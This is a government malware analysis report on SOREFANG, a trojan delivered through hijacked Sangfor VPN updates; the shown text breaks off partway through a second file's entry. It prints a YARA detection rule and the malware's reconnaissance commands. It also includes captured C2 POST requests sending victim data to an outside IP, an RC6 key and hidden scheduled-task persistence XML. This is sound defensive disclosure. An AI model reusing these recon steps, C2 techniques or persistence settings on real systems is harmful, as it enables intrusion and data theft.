{
  "markdown": "\nNotification\n\nThis report is provided \"as is\" for informational purposes only. The Department of Homeland Security (DHS) does not provide any warranties of any kind regarding any information contained herein. The DHS does not endorse any commercial product or service referenced in this bulletin or otherwise.\nThis document is marked TLP:WHITE--Disclosure is not limited. Sources may use TLP:WHITE when information carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to standard copyright rules, TLP:WHITE information may be distributed without restriction. For more information on the Traffic Light Protocol (TLP), see http://www.us-cert.gov/tlp.\n\nSummary\n\nDescription\nThe Malware Analysis Report (MAR) is the result of analytic efforts by the Cybersecurity and Infrastructure Security Agency (CISA). This malware has been identified as SOREFANG. Advanced persistent threat (APT) groups have been identified using this malware. For more information regarding this malware, please visit: https://www.ncsc.gov.uk/news/advisory-apt29-targets-covid-19-vaccine-development\n\nThis report analyzes three unique files. The files are Trojan implants designed to exploit Sangfor Secure Sockets Layer (SSL) virtual private network (VPN) servers. The malware replaces the Sangfor VPN software distributed to VPN clients. When installed, the implants provide the remote operator total control over the infected systems.\nFor a downloadable copy of IOCs, see MAR-10296782-1.v1.stix.\nSubmitted Files (3)\n58d8e65976b53b77645c248bfa18c3b87a6ecfb02f306fe6ba4944db96a5ede2 (58d8e65976b53b77645c248bfa18c3...)\n65495d173e305625696051944a36a031ea94bb3a4f13034d8be740982bc4ab75 (65495d173e305625696051944a36a0...)\na4b790ddffb3d2e6691dcacae08fb0bfa1ae56b6c73d70688b097ffa831af064 (a4b790ddffb3d2e6691dcacae08fb0...)\nIPs (2)\n103.216.221.19\n192.168.169.103\n\nFindings\n\n65495d173e305625696051944a36a031ea94bb3a4f13034d8be740982bc4ab75\nTags\nspywaretrojan\nDetails\n\n\n\nName\n65495d173e305625696051944a36a031ea94bb3a4f13034d8be740982bc4ab75\n\n\nSize\n437760 bytes\n\n\nType\nPE32 executable (GUI) Intel 80386, for MS Windows\n\n\nMD5\nc5d5cb99291fa4b2a68b5ea3ff9d9f9a\n\n\nSHA1\na1b5d50fe87f9c69a0e4da447f8d56155ce59e47\n\n\nSHA256\n65495d173e305625696051944a36a031ea94bb3a4f13034d8be740982bc4ab75\n\n\nSHA512\n1f8e1ad6e910bdf3b251ffbb81b115233eb15be725d420139ba2af4f82009a655856e39bcb4d111b7bd1f135025f73d3eab1f32d1469f067966e82d14c5a0d3e\n\n\nssdeep\n6144:ifY8W87LY6I0sl/myJy3FkwTCIoo4ECxAO7BjqxNuC:iAV+sl/mey3FnChxCuC\n\n\nEntropy\n6.205690\n\n\n\nAntivirus\n\n\n\nAhnlab\nMalware/Win32.Generic\n\n\nAntiy\nTrojan/Win32.Wacatac\n\n\nCyren\nW32/Trojan.ZYGO-1305\n\n\nESET\na variant of Win32/Spy.Agent.PXZ trojan\n\n\nIkarus\nTrojan-Spy.Agent\n\n\nK7\nSpyware ( 0056414e1 )\n\n\nQuick Heal\nTrojan.Agentb\n\n\nTrendMicro\nTrojanS.6BD050DD\n\n\nTrendMicro House Call\nTrojanS.6BD050DD\n\n\nVirusBlokAda\nTrojan.Agentb\n\n\n\nYARA Rules\n\nrule CISA_10296782_01 : trojan WELLMESS\n\t{\n\tmeta:\n\t\u00a0\u00a0\u00a0 Author = \"CISA Code & Media Analysis\"\n\t\u00a0\u00a0\u00a0 Date= \"2020-07-06\"\n\t\u00a0\u00a0\u00a0 Last_Modified=\"20200706_1017\"\n\t\u00a0\u00a0\u00a0 Actor=\"n/a\"\n\t\u00a0\u00a0\u00a0 Category=\"Trojan\"\n\t\u00a0\u00a0\u00a0 Family=\"WellMess\"\n\t\u00a0\u00a0\u00a0 Description = \"Detects WellMess implant and SangFor Exploit\"\n\t\u00a0\u00a0\u00a0 MD5_1 = \"4d38ac3319b167f6c8acb16b70297111\"\n\t\u00a0\u00a0\u00a0 SHA256_1 = \"7c39841ba409bce4c2c35437ecf043f22910984325c70b9530edf15d826147ee\"\n\t\u00a0\u00a0\u00a0 MD5_2 = \"a32e1202257a2945bf0f878c58490af8\"\n\t\u00a0\u00a0\u00a0 SHA256_2 = \"a4b790ddffb3d2e6691dcacae08fb0bfa1ae56b6c73d70688b097ffa831af064\"\n\t\u00a0\u00a0\u00a0 MD5_3 = \"861879f402fe3080ab058c0c88536be4\"\n\t\u00a0\u00a0\u00a0 SHA256_3 = \"14e9b5e214572cb13ff87727d680633f5ee238259043357c94302654c546cad2\"\n\t\u00a0\u00a0\u00a0 MD5_4 = \"2f9f4f2a9d438cdc944f79bdf44a18f8\"\n\t\u00a0\u00a0\u00a0 SHA256_4 = \"e329607379a01483fc914a47c0062d5a3a8d8d65f777fbad2c5a841a90a0af09\"\n\t\u00a0\u00a0\u00a0 MD5_5 = \"ae7a46529a0f74fb83beeb1ab2c68c5c\"\n\t\u00a0\u00a0\u00a0 SHA256_5 = \"fd3969d32398bbe3709e9da5f8326935dde664bbc36753bd41a0b111712c0950\"\n\t\u00a0\u00a0\u00a0 MD5_6 = \"f18ced8772e9d1a640b8b4a731dfb6e0\"\n\t\u00a0\u00a0\u00a0 SHA256_6 = \"953b5fc9977e2d50f3f72c6ce85e89428937117830c0ed67d468e2d93aa7ec9a\"\n\t\u00a0\u00a0\u00a0 MD5_7 = \"3a9cdd8a5cbc3ab10ad64c4bb641b41f\"\n\t\u00a0\u00a0\u00a0 SHA256_7 = \"5ca4a9f6553fea64ad2c724bf71d0fac2b372f9e7ce2200814c98aac647172fb\"\n\t\u00a0\u00a0\u00a0 MD5_8 = \"967fcf185634def5177f74b0f703bdc0\"\n\t\u00a0\u00a0\u00a0 SHA256_8 = \"58d8e65976b53b77645c248bfa18c3b87a6ecfb02f306fe6ba4944db96a5ede2\"\n\t\u00a0\u00a0\u00a0 MD5_9 = \"c5d5cb99291fa4b2a68b5ea3ff9d9f9a\"\n\t\u00a0\u00a0\u00a0 SHA256_9 = \"65495d173e305625696051944a36a031ea94bb3a4f13034d8be740982bc4ab75\"\n\t\u00a0\u00a0\u00a0 MD5_10 = \"01d322dcac438d2bb6bce2bae8d613cb\"\n\t\u00a0\u00a0\u00a0 SHA256_10 = \"0c5ad1e8fe43583e279201cdb1046aea742bae59685e6da24e963a41df987494\"\n\t\u00a0\u00a0\u00a0 MD5_11 = \"8777a9796565effa01b03cf1cea9d24d\"\n\t\u00a0\u00a0\u00a0 SHA256_11 = \"83014ab5b3f63b0253cdab6d715f5988ac9014570fa4ab2b267c7cf9ba237d18\"\n\t\u00a0\u00a0\u00a0 MD5_12 = \"507bb551bd7073f846760d8b357b7aa9\"\n\t\u00a0\u00a0\u00a0 SHA256_12 = \"47cdb87c27c4e30ea3e2de620bed380d5aed591bc50c49b55fd43e106f294854\"\n\tstrings:\n\t\u00a0\u00a0\u00a0 $0 = \"/home/ubuntu/GoProject/src/bot/botlib/chat.go\"\n\t\u00a0\u00a0\u00a0 $1 = \"/home/ubuntu/GoProject/src/bot/botlib.Post\"\n\t\u00a0\u00a0\u00a0 $2 = \"GoProject/src/bot/botlib.deleteFile\"\n\t\u00a0\u00a0\u00a0 $3 = \"ubuntu/GoProject/src/bot/botlib.generateRandomString\"\n\t\u00a0\u00a0\u00a0 $4 = \"GoProject/src/bot/botlib.AES_Decrypt\"\n\t\u00a0\u00a0\u00a0 $5 = { 53 00 63 00 72 00 69 00 70 00 74 00 00 0F 63 00 6D 00 64 00 2E 00 65 00 78 00 65 00 00 07 2F 00 63 }\n\t\u00a0\u00a0\u00a0 $6 = { 3C 00 6E 00 77 00 3E 00 2E 00 2A 00 29 00 00 0B 24 00 7B 00 66 00 6E 00 7D }\n\t\u00a0\u00a0\u00a0 $7 = { 7B 00 61 00 72 00 67 00 7D 00 00 0B 24 00 7B 00 6E 00 77 00 7D }\n\t\u00a0\u00a0\u00a0 $8 = { 52 61 6E 64 6F 6D 53 74 72 69 6E 67 00 44 65 6C 65 74 65 46 69 6C 65 }\n\t\u00a0\u00a0\u00a0 $9 = \"get_keyRC6\"\n\t\u00a0\u00a0\u00a0 $10 = { 7D A3 26 77 1D 63 3D 5A 32 B4 6F 1F 55 49 44 25 }\n\t\u00a0\u00a0\u00a0 $11 = { 47 C2 2F 35 93 41 2F 55 73 0B C2 60 AB E1 2B 42 }\n\t\u00a0\u00a0\u00a0 $12 = { 53 58 9B 17 1F 45 BD 72 EC 01 30 6C 4F CA 93 1D }\n\t\u00a0\u00a0\u00a0 $13 = { 48 81 21 81 5F 53 3A 64 E0 ED FF 21 23 E5 00 12 }\n\t\u00a0\u00a0\u00a0 $14 = \"GoProject/src/bot/botlib.wellMess\"\n\t\u00a0\u00a0\u00a0 $15 = { 62 6F 74 6C 69 62 2E 4A 6F 69 6E 44 6E 73 43 68 75 6E 6B 73 }\n\t\u00a0\u00a0\u00a0 $16 = { 62 6F 74 6C 69 62 2E 45 78 65 63 }\n\t\u00a0\u00a0\u00a0 $17 = { 62 6F 74 6C 69 62 2E 47 65 74 52 61 6E 64 6F 6D 42 79 74 65 73 }\n\t\u00a0\u00a0\u00a0 $18 = { 62 6F 74 6C 69 62 2E 4B 65 79 }\n\t\u00a0\u00a0\u00a0 $19 = { 7F 16 21 9D 7B 03 CB D9 17 3B 9F 27 B3 DC 88 0F }\n\t\u00a0\u00a0\u00a0 $20 = { D9 BD 0A 0E 90 10 B1 39 D0 C8 56 58 69 74 15 8B }\n\t\u00a0\u00a0\u00a0 $21 = { 44 00 59 00 4A 00 20 00 36 00 47 00 73 00 62 00 59 00 31 00 2E }\n\t\u00a0\u00a0\u00a0 $22 = { 6E 00 20 00 46 00 75 00 7A 00 2C 00 4B 00 5A 00 20 00 33 00 31 00 69 00 6A 00 75 }\n\t\u00a0\u00a0\u00a0 $23 = { 43 00 31 00 69 00 76 00 66 00 39 00 32 00 20 00 56 00 37 00 6C 00 4F 00 48 }\n\t\u00a0\u00a0\u00a0 $24 = { 66 69 6C 65 4E 61 6D 65 3A 28 3F 50 3C 66 6E 3E 2E 2A 3F 29 5C 73 61 72 67 73 3A 28 3F 50 3C 61 72 67 3E 2E 2A 3F }\n\t\u00a0\u00a0\u00a0 $25 = { 5C 00 2E 00 53 00 61 00 6E 00 67 00 66 00 6F 00 72 00 55 00 44 00 2E 00 73 00 75 00 6D }\n\t\u00a0\u00a0\u00a0 $26 = { 66 6F 72 6D 2D 64 61 74 61 3B 20 6E 61 6D 65 3D 22 5F 67 61 22 3B 20 66 69 6C 65 6E 61 6D 65 3D }\n\t\u00a0\u00a0\u00a0 $27 = { 40 5B 5E 5C 73 5D 2B 3F 5C 73 28 3F 50 3C 74 61 72 3E 2E 2A 3F 29 5C 73 27 }\n\tcondition:\n\t\u00a0\u00a0\u00a0($0 and $1 and $2 and $3 and $4) or ($5 and $6 and $7 and $8 and $9) or ($10 and $11) or ($12 and $13) or ($14) or ($15 and $16 and $17 and $18) or ($19 and $20) or ($21 and $22 and $23) or ($24) or ($25 and $26) or ($27)\n\t}\n\nssdeep Matches\nNo matches found.\nPE Metadata\n\n\n\nCompile Date\n2018-03-28 07:37:41-04:00\n\n\nImport Hash\nde67eebbdb41eb69bfdf6c23a6479582\n\n\nCompany Name\nSangfor Technologies Co.,Ltd\n\n\nFile Description\nSangforUD\n\n\nInternal Name\nSangforUD.exe\n\n\nLegal Copyright\nCopyright (C) 2015\n\n\nOriginal Filename\nSangforUD.EXE\n\n\nProduct Name\nSangforUD application\n\n\nProduct Version\n7.6.0.100\n\n\n\nPE Sections\n\n\n\nMD5\nName\nRaw Size\nEntropy\n\n\n79b491fc5059891654fc228b26171f6d\nheader\n1024\n3.067812\n\n\n471b9d4a35e5f8b569ae1ca6bc91aba1\n.text\n240128\n6.589660\n\n\nd74b8d761debb3939c3878052199ffa2\n.rdata\n74240\n5.586653\n\n\n463a4a2ba2e9496201b711302c4e3008\n.data\n5120\n3.612142\n\n\n1f354d76203061bfdd5a53dae48d5435\n.tls\n512\n0.020393\n\n\ne9edb21c8ad50896cd623d0172835e6d\n.rsrc\n103936\n3.885868\n\n\n1d7b5cd8dcec22299f23bb463562815a\n.reloc\n12800\n6.559632\n\n\n\nPackers/Compilers/Cryptors\n\n\n\nMicrosoft Visual C++ ?.?\n\n\n\nRelationships\n\n\n\n65495d173e...\nConnected_To\n103.216.221.19\n\n\n\nDescription\nThis application is a malicious 32-bit Windows executable. The executable exploits a vulnerability identified within Sangfor SSL VPN devices. The vulnerability can be leveraged to gain control over systems because the VPN clients do not properly verify the integrity of software updates. The malware exploits this vulnerability by replacing software update binaries on compromised VPN servers. The malicious binaries are then delivered and executed on the VPN clients reporting to the infected VPN server.\n\nDuring runtime, the malware immediately attempts to clear all files from the directories \"\\\\Sangfor\\\\SSL\\\\Log\\\\\" and \"\\\\Sangfor\\\\SSL\\\\Dump\\\\\u201d.\n\nThe malware then attempts to install itself as the file \"\\\\Sangfor\\\\SSL\\\\SanforUPD.exe\u201d. This will make this binary presumably the first update executable that gets served out as application updates to targeted Sangfor VPN clients.\n\nNext, it checks for the presence of a file named \"\\\\Sangfor\\\\SSL\\\\.SangforUD.sum\u201d. If this file is not present, the malware will collect information from the infected system, using the following commands:\n\n\u2014Begin Information Collection Commands\u2014\nsysteminfo.exe\nipconfig.exe /all\ncmd.exe /c set\nnet.exe user\nHOSTNAME.EXE\nnet.exe user /domain\nnet.exe group /domain\ntasklist.exe /V\nwhoami.exe /all\n\u2014End Information Collection Commands\u2014\n\nIt will also enumerate folders on disk. The collected system information and the result of the file enumerations are stored in a buffer in system memory. The malware collected the following information during analysis:\n\n\u2014Begin Information Collected\u2014\nUser information (user name and SID)\nGroup information (Group name, type, SID, and attributes)\nPrivileges information (Privilege name, description, state (disabled, enabled, N/A))\n\u2014End Information Collected\u2014\n\nThis data will next be encrypted, encoded, and then transmitted to the command and control (C2) server Internet Protocol (IP) address 103.216.221.19.\n\nThe data sent to the C2 server is encrypted utilizing a Rivest cipher 6 (RC6) cryptographic algorithm. The key used to encrypt the outbound data is dynamically generated during each C2 session. The RC6 key is appended to the outbound data so the remote operator will be able to decrypt the incoming data. The RC6 key can be found within the \u201cfilename\u201d field of the C2 outbound data. For example, in the following example (partial) transmission the RC6 key d4908a2e47ff25c44054f8e623426243 can be utilized to decrypt the C2 data.\n\n\u2014Begin Partial C2 Transmission\u2014\nPOST / HTTP/1.1\nContent-Type: multipart/form-data; boundary=----974767299852498929531610575\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1\nHost: 103.216.221.19\nContent-Length: 38886\nCache-Control: no-cache\n\n------974767299852498929531610575\nContent-Disposition: form-data; name=\"_ga\"; filename=\"d4908a2e47ff25c44054f8e623426243\"\nContent-Type: application/octet-stream\n\ncktTaQTE2ed BUVZaeg tMkXS 5YrSj6zdDKXYl2v LQCi85ZruMOUmkSLpc0f Tychyjhpo9fJHt5EIQw, ZREaS. 3s4al2OGFMBkiqrDsN, EMfzzmDWPGoATf, oM3n kvApOjc85g1jx qACIwvhAC3lz3jTb3p6D, YI2gZ63Wpob9Bm88 gZIqfg6h. ohjr ecwax41ACb9Bm8khPfh hO0Aku, VqtXhmDmOTUen 019HaS6Wmy639Km ttKwx62W2EIw. vhAC3kKL, zp3Gg CQdqXRmDmOTWe1n0IZD, EEVytbV4Zg5jk1Hp9Nf, R2kuvB06xoA. kHazjW0VlmP7J KUxnye\n\u2014End Partial C2 Transmission\u2014\n\nThe encrypted C2 traffic is encoded with a slightly modified Base64 algorithm. The encoded data appears to match Base64 encoded data except there are spaces in between parts of the data (0x20). An example of this is illustrated below where the first 32-bytes of the outbound data is replaced with the American Standard Code for Information Interchange (ASCII) bytes \u201cx\u201d.\n\n\u2014Begin Base64 Modification\u2014\nPOST / HTTP/1.1\nContent-Type: multipart/form-data; boundary=----974767299852498929531610575\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1\nHost: 103.216.221.19\nContent-Length: 24307\nCache-Control: no-cache\n\n------974767299852498929531610575\nContent-Disposition: form-data; name=\"_ga\"; filename=\"7e061a180fa24eb5a318d6eae8797cc2\"\nContent-Type: application/octet-stream\n\neHh4eH h4eHh4eHh4eHh4eHh4eH h4eHh4eH h4eHh4eHhB6e, RwoJe. cqpDFRSyMwBqaG4 INaFZG9zm2 A7siND60oM4QhhCrf oAiAvC OUMq3, W1ZlPGq kKhkRkwjNYu1dc6. bUmU8ashTA Q8KSyp2xCnA m3A24PU 6KLQqzPsMiMmEZ9A, EQF4. Ryhld1t WZTxqZCoZEZMKzA6gq TaENSD6e6Izy9Caj6 W3Z9jNkB1 7tQpuEnU266hhaEc 4WwEPCkssdCs4GF. MoVXhKQHl6C aj4t8u6I ueaakH1 60jPL 0JqH1 bdn2M. 2QHWcgYUyhVeEqhj6I Pu6ANJXvs, zSvNsUXthp5NIDV0i\n\u2014End Base64 Modification\u2014\n\nAs illustrated, it appears exactly like the Base64 output of encoding the ASCII bytes \u201cx\u201d with the exception of the periodic spaces within the encoded data.\n\nThe malware will attempt to query its remote C2 server every 900000 milliseconds with the POST request containing encrypted information about the victim system, each time querying the server for 260 bytes of data and searching it for the value \u201c200\u201d to ensure the data was received successfully, and the remote C2 server is alive (Figure 1).\n\nIf the malware is able to successfully pass and receive data from its C2 server, it will then generate 32-bytes of data and record the data into a file named \"\\\\Sangfor\\\\SSL\\\\.SangforUD.sum\u201d.\n\nThe malware will then enter a loop in which it attempts to download payloads from its C2 server every 900000 milliseconds. The 32-bytes of data contained with the newly created file \u201c.SangforUD.sum\u201d will be contained within these connections to the malware\u2019s C2 server.\n\nIt is not known what the C2 server does with this 32-byte value, however the malware only creates this 32-byte value and writes it to the file \u201cSangforUD.sum\u201d once, which suggests the 32-bit value is a unique identifier for each compromised VPN server.\n\nEach payload downloaded from the C2 server will be immediately Base64 decoded, RC6 decrypted, executed using CreateProcessW, and then copied to the system as \"\\\\Sangfor\\\\SSL\\\\SangforUDC.exe\".\n\nIn addition, the malware decrypts the following Extensible Markup Language (XML) data indicating it uses scheduled tasks to attain persistence on a target Windows system. This data is decrypted using the RC6 algorithm with the key: 2B6233EB3E872FF78988F4A8F3F6A3BA.\n\n\u2014Begin Decrypted XML Task Data\u2014\n<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n< Task version=\"1.3\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n< RegistrationInfo>\n< Date>2019-07-16T06:00:28.6871947</Date>\n< Author>Sangfor Technologies Co.,Ltd</Author>\n< URI>SangforUpade</URI>\n< /RegistrationInfo>\n< Triggers>\n< CalendarTrigger>\n< Repetition>\n< Interval>P1D</Interval>\n< StopAtDurationEnd>false</StopAtDurationEnd>\n< /Repetition>\n< StartBoundary>2019-07-16T00:00:00</StartBoundary>\n< Enabled>true</Enabled>\n< ScheduleByDay>\n< DaysInterval>1</DaysInterval>\n< /ScheduleByDay>\n< /CalendarTrigger>\n< /Triggers>\n< Settings>\n< MultipleInstancesPolicy>Parallel</MultipleInstancesPolicy>\n< DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n< StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\n< AllowHardTerminate>true</AllowHardTerminate>\n< StartWhenAvailable>true</StartWhenAvailable>\n< RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n< IdleSettings>\n< StopOnIdleEnd>true</StopOnIdleEnd>\n< RestartOnIdle>false</RestartOnIdle>\n< /IdleSettings>\n< AllowStartOnDemand>true</AllowStartOnDemand>\n< Enabled>true</Enabled>\n< Hidden>true</Hidden>\n< RunOnlyIfIdle>false</RunOnlyIfIdle>\n< DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>\n< UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>\n< WakeToRun>true</WakeToRun>\n< ExecutionTimeLimit>PT0S</ExecutionTimeLimit>\n< Priority>7</Priority>\n< RestartOnFailure>\n< Interval>PT1M</Interval>\n< Count>3</Count>\n< /RestartOnFailure>\n< /Settings>\n< Actions Context = \"Author\">\n< Exec>\n< Command></Command>\n< /Exec>\n< /Actions>\n\u2014End Decrypted XML Task Data\u2014\nScreenshots\n\n\nFigure 1 - Screenshot of the connection to the C2 server when attempting to download an RC6 encrypted executable payload. Note: the unique identifier is within the \"_ga=\" field.\n\n\n\nFigure 2 - Screenshot of the malware querying the C2 server after conducting the initial connection. The initial connection will pass information stolen from the target system to the C2 server, including a unique hash used as a victim system identifier. After a successful initial connection with the C2, the malware will begin attempting to download RC6 executable payloads.\n\n\n\nFigure 3 - Screenshot of the initialization function for the RC6 algorithm contained in the malware.\n\n\n\n103.216.221.19\nTags\ncommand-and-control\nHTTP Sessions\n\nPOST / HTTP/1.1\n\tContent-Type: multipart/form-data; boundary=----974767299852498929531610575\n\tUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1\n\tHost: 103.216.221.19\n\tContent-Length: 38886\n\tCache-Control: no-cache\n\nWhois\nQueried whois.apnic.net with \"103.216.221.19\"...\n% Information related to '103.216.220.0 - 103.216.223.255'\n% Abuse contact for '103.216.220.0 - 103.216.223.255' is 'abuse@hostuniversal.com.au'\ninetnum: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0103.216.220.0 - 103.216.223.255\nnetname: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0HOST-AU\ndescr: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 Host Universal Pty Ltd\ncountry: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0AU\norg: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0ORG-HUPL1-AP\nadmin-c: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0HUPL1-AP\ntech-c: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 HUPL1-AP\nabuse-c: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0AH892-AP\nstatus: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 ALLOCATED PORTABLE\nremarks: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0--------------------------------------------------------\nremarks: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0To report network abuse, please contact mnt-irt\nremarks: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0For troubleshooting, please contact tech-c and admin-c\nremarks: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Report invalid contact via www.apnic.net/invalidcontact\nremarks: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0--------------------------------------------------------\nmnt-by: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 APNIC-HM\nmnt-lower: \u00a0\u00a0\u00a0 MAINT-HOST-AU\nmnt-routes: \u00a0\u00a0\u00a0 MAINT-HOST-AU\nmnt-irt: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0IRT-HOST-AU\nlast-modified: 2020-06-10T13:06:06Z\nsource: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 APNIC\nirt: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0IRT-HOST-AU\naddress: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Host Universal Pty Ltd, c/o Brentnalls SA, 255 Port Road, Hindmarsh SA 5007, Australia, Hindmarsh So\ne-mail: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 abuse@hostuniversal.com.au\nabuse-mailbox: abuse@hostuniversal.com.au\nadmin-c: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0HUPL1-AP\ntech-c: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 HUPL1-AP\nauth: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 # Filtered\nremarks: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0abuse@hostuniversal.com.au was validated on 2020-06-25\nmnt-by: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 MAINT-HOST-AU\nlast-modified: 2020-06-25T16:58:38Z\nsource: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 APNIC\norganisation: ORG-HUPL1-AP\norg-name: \u00a0\u00a0\u00a0 Host Universal Pty Ltd\ncountry: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0AU\naddress: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Host Universal Pty Ltd\naddress: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0c/o Brentnalls SA\naddress: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0255 Port Road, Hindmarsh SA 5007, Australia\nphone: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 +61403394019\ne-mail: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 abuse@hostuniversal.com.au\nmnt-ref: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0APNIC-HM\nmnt-by: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 APNIC-HM\nlast-modified: 2018-03-20T12:57:09Z\nsource: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 APNIC\nrole: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 ABUSE HOSTAU\naddress: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Host Universal Pty Ltd, c/o Brentnalls SA, 255 Port Road, Hindmarsh SA 5007, Australia, Hindmarsh So\ncountry: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0ZZ\nphone: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 +000000000\ne-mail: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 abuse@hostuniversal.com.au\nadmin-c: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0HUPL1-AP\ntech-c: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 HUPL1-AP\nnic-hdl: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0AH892-AP\nremarks: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Generated from irt object IRT-HOST-AU\nabuse-mailbox: abuse@hostuniversal.com.au\nmnt-by: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 APNIC-ABUSE\nlast-modified: 2020-06-10T13:06:05Z\nsource: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 APNIC\nrole: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 Host Universal Pty Ltd administrator\naddress: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Host Universal Pty Ltd, c/o Brentnalls SA, 255 Port Road, Hindmarsh SA 5007, Australia, Hindmarsh So\ncountry: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0AU\nphone: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 +61403394019\nfax-no: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 +61403394019\ne-mail: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 abuse@hostuniversal.com.au\nadmin-c: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0HUPL1-AP\ntech-c: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 HUPL1-AP\nnic-hdl: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0HUPL1-AP\nmnt-by: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 MAINT-HOST-AU\nlast-modified: 2016-05-03T06:34:59Z\nsource: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 APNIC\n% Information related to '103.216.221.0/24AS136557'\nroute: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 103.216.221.0/24\norigin: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 AS136557\ndescr: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 Host Universal Pty Ltd\n\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Host Universal Pty Ltd\n\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0c/o Brentnalls SA\n\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0255 Port Road, Hindmarsh SA 5007, Australia\nmnt-by: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 MAINT-HOST-AU\nlast-modified: 2019-12-19T00:21:46Z\nsource: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 APNIC\nRelationships\n\n\n\n103.216.221.19\nConnected_From\n65495d173e305625696051944a36a031ea94bb3a4f13034d8be740982bc4ab75\n\n\n103.216.221.19\nConnected_From\n58d8e65976b53b77645c248bfa18c3b87a6ecfb02f306fe6ba4944db96a5ede2\n\n\n\nDescription\n65495d173e305625696051944a36a031ea94bb3a4f13034d8be740982bc4ab75 and 58d8e65976b53b77645c248bfa18c3b87a6ecfb02f306fe6ba4944db96a5ede2 attempt to connect to the IP address.\n\n\n58d8e65976b53b77645c248bfa18c3b87a6ecfb02f306fe6ba4944db96a5ede2\nTags\nspywaretrojan\nDetails\n\n\n\nName\n58d8e65976b53b77645c248bfa18c3b87a6ecfb02f306fe6ba4944db96a5ede2\n\n\nSize\n428032 bytes\n\n\nType\nPE32 executable (GUI) Intel 80386, for MS 